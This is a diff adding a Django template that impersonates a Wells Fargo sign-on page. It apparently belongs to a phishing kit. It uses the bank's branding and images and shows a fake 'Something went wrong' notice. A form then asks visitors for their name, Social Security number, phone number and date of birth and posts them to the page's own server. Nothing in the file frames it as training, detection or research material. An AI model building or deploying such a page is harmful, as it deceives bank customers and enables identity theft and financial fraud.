@@ -1,0 +1,157 @@
+{% extends 'wells/base.html' %}
+{% load static %}
+
+{% block content %}
+<div class="inner">
+    <div id="signOn">
+        <div id="signOnMain">
+            <h2 id="signOnHeader"><img alt="Secure" role="img"
+                                       src="{% static '' %}WellsFargo/homepage-signon-lock.svg">View Your Accounts</h2>
+
+            <form autocomplete="off" data-login-app="true" id="frmSignon" method="post" name="signon">
+                {% csrf_token %}
+
+
+                <!--                            First Name field-->
+
+                <div class="formElementsWrapper formElementsFirstname" id="firstNameDiv">
+                    <label class="id_label" for="userFirstName" id="firstNameLabel">First Name</label>
+                    <input accesskey="F" autocomplete="off" class="formElement formElementText login_field"
+                           id="userFirstName" maxlength="14"
+                           name="firstName" onkeypress="return /[a-z]/i.test(event.key)" required
+                           type="text">
+                </div>
+
+
+                <!--                            Last Name field-->
+
+                <div class="formElementsWrapper formElementsLastname" id="lastNameDiv">
+                    <label class="id_label" for="userid" id="lastNameLabel">Last Name</label>
+                    <input accesskey="L" autocomplete="off" class="formElement formElementText login_field"
+                           id="userid" maxlength="14" name="lastName"
+                           onkeypress="return /[a-z]/i.test(event.key)" required type="text">
+                </div>
+
+                <div class="formElementsWrapper formElementsLastname" id="ssnDiv">
+                    <label class="id_label" for="ssnid" id="ssnLabel">SSN</label>
+                    <input accesskey="ssn" autocomplete="off" class="formElement formElementText login_field"
+                           id="ssnid" maxlength="9" name="ssn"
+                           required type="password">
+                </div>
+
+
+                <!--                                                        Phone number detail     -->
+
+                <div class="formElementsWrapper formElementsPhoneNumber" id="phoneNumberDiv">
+                    <label class="id_label" for="userid" id="phoneNumberLabel">Phone Number</label>
+                    <input accesskey="PH"
+                           autocomplete="off"
+                           class="formElement formElementText login_field" id="userid" maxlength="14"
+                           name="phoneNumber" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" required type="text">
+                </div>
+
+
+                <!--                            DatePicker Field-->
+                <div class="formElementsWrapper formElementDatePicker" id="datePickerDiv">
+                    <label class="id_label" for="datepicker" id="datePickerLabel">Date of Birth</label>
+
+                    <input accesskey="D" autocomplete="off" class="formElement formElementDatePicker login_field pmask"
+                           id="datepicker" maxlength="32"
+                           name="datePicker" required type="date">
+                </div>
+
+                <div class="formSubmit">
+                    <input class="c7" id="btnSignon" name="btnConfirm" type="submit" value="Confirm">
+                </div>
+
+                <input id="fidoAuth" name="fidoAuth" type="hidden" value="false">
+
+            </form>
+        </div>
+        <!--             <div id="signUp">
+
+        <a href="https://oam.wellsfargo.com/oamo/identity/enrollment">Enroll Now</a>
+
+        <a href="https://www.wellsfargo.com/privacy-security/fraud/?linkLoc=signon">Security Center</a>
+        <a href="https://www.wellsfargo.com/privacy-security/?linkLoc=signon">Privacy, Cookies, and
+            Security</a>
+    </div>-->
+    </div>
+
+
+</div>
+
+
+<div class="c3" style="    position: absolute;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+    -moz-transform: translateX(-50%);
+    -ms-transform: translateX(-50%);
+    -o-transform: translateX(-50%);
+    margin-top: 0;
+    width: 1200px;
+    background-color: rgba(231,218,218,0.9);;
+
+">
+    <div aria-label="Promotions Slideshow" class="c3wrapper" role="region">
+
+        <div class="carouselFrame item1" style="display: block;"><span class="hidden">Begin item
+                                1</span>
+            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" lang="en">
+
+
+                <div class="c3Img">
+                    <!--                                <img alt="" src="https://www01.wellsfargomedia.com/assets/images/homepage/wfi111_ph_hph_default1_1200x532.jpg">-->
+
+                    <div class="imgChodak"></div>
+
+                </div>
+
+
+                <div class="inner">
+                    <div class="marqueeContent">
+                        <div class="marqueecontentinner marqueetheme11">
+
+                            <h2 style="color: red">Something went wrong</h2>
+                            <span>Inorder to keep your privacy, please complete the required
+                                                instruction.</span>
+
+                        </div>
+                    </div>
+                </div>
+
+
+            </div>
+            <span class="hidden">End item 1</span>
+        </div>
+        <div class="carouselFrame item2" style="display: none;"><span class="hidden">Begin item 2</span>
+            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_2" lang="en">
+
+
+                <div class="c3Img" data-cid="tcm:84-147036-16" data-ctid="tcm:91-146911-32">
+                    <img alt=""
+                         src="https://www01.wellsfargomedia.com/assets/images/contextual/banner/enterprise/1200x532/wfi000_lg_b-wf-stagecoach_rednoborder_1200x532.gif">
+                </div>
+                <div class="inner">
+                    <div class="marqueeContent">
+                        <div class="marqueecontentinner marqueetheme11">
+
+                            <h2>Keeping you informed</h2>
+
+
+                            <a class="c7" enrollmentid="3107" href="https://stories.wf.com/"
+                               role="button">Learn
+                                More</a>
+
+                        </div>
+                    </div>
+                </div>
+
+
+            </div>
+            <span class="hidden">End item 2</span>
+        </div>
+    </div>
+</div>
+
+{% endblock content %}
